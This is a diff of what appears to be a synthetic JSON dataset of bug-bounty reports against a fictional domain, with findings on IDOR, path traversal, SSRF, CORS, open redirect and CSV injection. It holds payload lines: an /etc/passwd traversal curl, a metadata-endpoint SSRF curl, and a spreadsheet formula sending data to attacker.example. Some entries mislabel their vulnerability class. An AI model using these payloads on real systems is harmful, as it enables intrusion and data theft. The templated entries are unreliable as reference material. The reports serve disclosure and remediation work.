+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://payments.rabenbrunn-it.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12834,7 +12932,8 @@
           "offset": "1d 1h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://payments.rabenbrunn-it.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12954,7 +13053,8 @@
           "offset": "5d 9h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://payments.rabenbrunn-it.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13082,7 +13182,8 @@
           "offset": "6d",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.rabenbrunn-it.foo/import`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13242,7 +13343,8 @@
           "offset": "5d 4h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.rabenbrunn-it.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13381,7 +13483,8 @@
           "offset": "3d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.rabenbrunn-it.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13496,7 +13599,8 @@
           "offset": "9d 6h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.rabenbrunn-it.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13592,7 +13696,8 @@
           "offset": "1d 10h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.rabenbrunn-it.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13691,7 +13796,8 @@
           "offset": "3d 5h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rabenbrunn-it.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13878,7 +13984,8 @@
           "offset": "8d 9h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.rabenbrunn-it.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13993,7 +14100,8 @@
           "offset": "3d 8h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.rabenbrunn-it.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14084,7 +14192,8 @@
           "offset": "9h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rabenbrunn-it.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14200,7 +14309,8 @@
           "offset": "3d 10h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.rabenbrunn-it.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14356,7 +14466,8 @@
           "offset": "5d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.rabenbrunn-it.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14491,7 +14602,8 @@
           "offset": "10d 18h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.rabenbrunn-it.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14614,7 +14726,8 @@
           "offset": "4d 5h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rabenbrunn-it.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14749,7 +14862,8 @@
           "offset": "9d 6h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.rabenbrunn-it.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -14868,7 +14982,8 @@
           "offset": "5d 8h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.rabenbrunn-it.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14983,7 +15098,8 @@
           "offset": "4d 17h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.rabenbrunn-it.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15159,7 +15275,8 @@
           "offset": "6d 3h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.rabenbrunn-it.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15278,7 +15395,8 @@
           "offset": "2d 5h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.rabenbrunn-it.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15431,7 +15549,8 @@
           "offset": "4d 5h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15525,7 +15644,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.rabenbrunn-it.foo/export`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15642,7 +15762,8 @@
           "offset": "14h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15746,7 +15867,8 @@
           "offset": "1d 8h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.rabenbrunn-it.foo/api/me`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15861,7 +15983,8 @@
           "offset": "2d 15h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.rabenbrunn-it.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15964,7 +16087,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.rabenbrunn-it.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16091,7 +16215,8 @@
           "offset": "8d 22h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rabenbrunn-it.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16193,7 +16318,8 @@
           "offset": "2d 21h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16316,7 +16442,8 @@
           "offset": "6d 1h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rabenbrunn-it.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16463,7 +16590,8 @@
           "offset": "5d 1h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rabenbrunn-it.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16542,7 +16670,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
